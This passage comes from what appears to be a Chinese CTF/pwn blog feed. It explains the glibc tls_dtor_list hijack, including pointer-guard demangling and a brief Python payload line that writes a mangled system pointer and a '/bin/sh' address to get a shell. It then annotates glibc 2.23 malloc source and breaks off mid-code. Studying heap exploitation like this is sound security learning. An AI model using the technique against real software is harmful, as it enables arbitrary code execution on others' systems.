attack</li><li>能泄露libc和heap</li><li><strong>程序能够显式的执行exit函数</strong>或者<strong>main函数能够返回</strong>,</li></ol><p><strong>利用效果:</strong>程序流执行</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-21"><a href="#原理-21" class="headerlink" title="原理"></a>原理</h2><p>首先来看<code>dtor_list</code>结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> __thread <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">tls_dtor_list</span>;</span></span><br></pre></td></tr></table></figure><p>可以看到，<code>tls_dtor_list</code>就是<code>dtor_list</code>的结构体指针，里面存放着一个<code>dtor_list</code>结构体的地址。<br>再看到<code>__call_tls_dtors</code>函数（对<code>tls_dtor_list</code>进行遍历）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"> </span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可知，<code>dtor_list</code>结构体中的<code>func</code>成员，其实是一个函数指针，而其中的<code>obj</code>成员就是其调用时的参数。</p><p>若我们可以劫持<code>tls_dtor_list</code>，在其中写入我们伪造的堆地址，使其不为空（绕过<code>while (tls_dtor_list)</code>），就能执行到<code>func (cur-&gt;obj)</code>，而我们又可以控制伪造的堆块中<code>prev_size</code>域为<code>system</code>的相关数据（由于有指针保护，之后会讲），<code>size</code>域为<code>/bin/sh</code>的地址（通过上一个堆块的溢出或合并后重分配），这样就能<code>getshell</code>了，若是想<code>orw</code>，那么可以让<code>func</code>成员为<code>magic_gadget</code>的相关数据，将<code>rdi</code>与<code>rdx</code>转换后，再调用<code>setcontext + 61</code>走<code>SROP</code>即可。</p><p>需要注意的是，在调用<code>func</code>函数指针之前，对<code>func</code>执行了<code>PTR_DEMANGLE (func)</code>，这是一个指针保护，我们可以通过<code>gdb</code>直接看到其汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ror    rax,0x11</span><br><span class="line">xor    rax,QWORD PTR fs:0x30</span><br><span class="line">mov    QWORD PTR fs:[rbx],rdx</span><br><span class="line">mov    rdi,QWORD PTR [rbp+0x8]</span><br><span class="line">call   rax</span><br></pre></td></tr></table></figure><p>这操作主要是先进行<strong>循环右移</strong><code>0x11</code>位，再与<code>fs:0x30（tcbhead_t-&gt;pointer_guard）</code>进行<strong>异或</strong>，最终得到的数据就是我们的函数指针，并调用。<br>因此，我们在之前所说的将<code>func</code>成员改成的与<code>system</code>相关的数据，就是对指针保护进行一个逆操作：先将<code>system_addr</code>与<code>pointer_guard</code>进行异或，再将结果循环左移<code>0x11</code>位后，填入<code>prev_size</code>域。<br>然而，<code>pointer_guard</code>的值在<code>TLS</code>结构中（在<code>canary</code>保护<code>stack_guard</code>的下一个），我们很难直接得到它的值，但是我们可以通过一些攻击手段，往其中写入我们可控数据，这样就可以控制<code>pointer_guard</code>，进而绕过指针保护了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 两次largebin attack改tls_dtor_list与pointer_guard</span></span><br><span class="line"> </span><br><span class="line">fake_pointer_guard = heap_base + <span class="number">0x17b0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x420</span> + p64(ROL(libc.sym[<span class="string">&#x27;system&#x27;</span>] ^ fake_pointer_guard, <span class="number">0x11</span>, <span class="number">64</span>)) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
            <tag> how2heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc-free实现变化</title>
      <link href="/posts/61238/"/>
      <url>/posts/61238/</url>
      
        <content type="html"><![CDATA[<span class='p '>以几个主要的经典版本为基础</span><p>另外只关注实现部分,安全检查部分见对应文章</p><h1 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h1><p>2.23是一个十分经典的版本,以其作为基础</p><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先判断__malloc_hook符号是否为NULL,如果不为NULL则调用hook函数</li><li>获得arena</li><li>调用__int_malloc获得victim</li><li>如果victim为NULL或者arena不为NULL,再次尝试进行2,3分配</li><li>如果arena不为空,解锁arena的互斥锁</li><li>assert依次判定victim为NULL?vicitim是mmap分配?arena是否匹配?如果三个皆不满足则abort</li></ol><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="初始工作"><a href="#初始工作" class="headerlink" title="初始工作"></a>初始工作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">    mmap.  */</span></span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;      \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);      \</span></span><br><span class="line"><span class="meta">      return 0;      \</span></span><br><span class="line"><span class="meta">    &#125;      \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);</span></span><br></pre></td></tr></table></figure><p>检查申请大小是否合规并转化为真正的chunksize</p><p>虽然代码上是先检查申请大小是否合规再将其转化为chunksize,但真正运行中更多时候顺序是反过来的</p><p>如果arena是NULL采用mmap分配并返回</p><h4 id="fastbin-FILO"><a href="#fastbin-FILO" class="headerlink" title="fastbin(FILO)"></a>fastbin(FILO)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index (nb); <span class="comment">//计算出索引</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//获得单链表头节点</span></span><br><span class="line">    mchunkptr pp = *fb;<span class="comment">//获得第一个chunk</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">//检查</span></span><br><span class="line">          &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//chunk2mem转换地址</span></span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>通过宏fastbin_index(sz)得到对应的fastbin索引</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>然后拿到该索引链的地址</p><p>victim赋值为该链的第一个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim = pp;</span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">       != victim);</span><br></pre></td></tr></table></figure><p>其中用到了一些原子操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> atomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (mem) __gmemp = (mem);      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gret = *__gmemp;      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gnewval = (newval);      \</span></span><br><span class="line"><span class="meta">      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__gret == (oldval))      \</span></span><br><span class="line"><span class="meta">       *__gmemp = __gnewval;      \</span></span><br><span class="line"><span class="meta">     __gret; &#125;)</span></span><br></pre></td></tr></table></figure><p>就是比较mem指向的值是否等于oldval,如果等于则将mem指向的值变为newval,并返回oldval</p><p>如果victim不为NULL,检查其大小计算得出的索引是否符合当前索引链</p><p>最后有个检查调用<code>check_remalloced_chunk (av, victim, nb);</code></p><p>但因为宏编译的一些变量,它一般是空代码</p><h4 id="smallbin-FIFO"><a href="#smallbin-FIFO" class="headerlink" title="smallbin(FIFO)"></a>smallbin(FIFO)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);<span class="comment">//计算索引</span></span><br><span class="line">     bin = bin_at (av, idx);<span class="comment">//初始化链表头</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//检测链为空</span></span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);<span class="comment">//设置下一个chunk的p位</span></span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;<span class="comment">//设置A位</span></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果当前链不为空才进入分配</p><ol><li>如果是因为堆未初始化导致的误判链不为空,触发malloc_consolidate (av);</li><li>否则取出</li></ol><h4 id="largebin-FIFO"><a href="#largebin-FIFO" class="headerlink" title="largebin(FIFO)"></a>largebin(FIFO)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到,申请largebin时,并不会直接进入largebin中寻找,而是会:</p><ol><li>判断是否有fastchunk,是则触发malloc_consolidate (av);</li><li>进入unsortedbin遍历循环,找到则返回</li><li>进入largebin分配</li></ol><h4 id="大循环"><a href="#大循环" class="headerlink" title="大循环"></a>大循环</h4><p>接下来几个部分,都是这个大循环的一部分</p><h4 id="unsortedbin-FIFO-遍历"><a href="#unsortedbin-FIFO-遍历" class="headerlink" title="unsortedbin(FIFO)遍历"></a>unsortedbin(FIFO)遍历</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;<span class="comment">//当满足nb为smallbin范围,且unsorted中只有一个last_remainer时</span></span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);   <span class="comment">//刚好相等</span></span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;  <span class="comment">//放入smallbin</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//放入largebin</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> 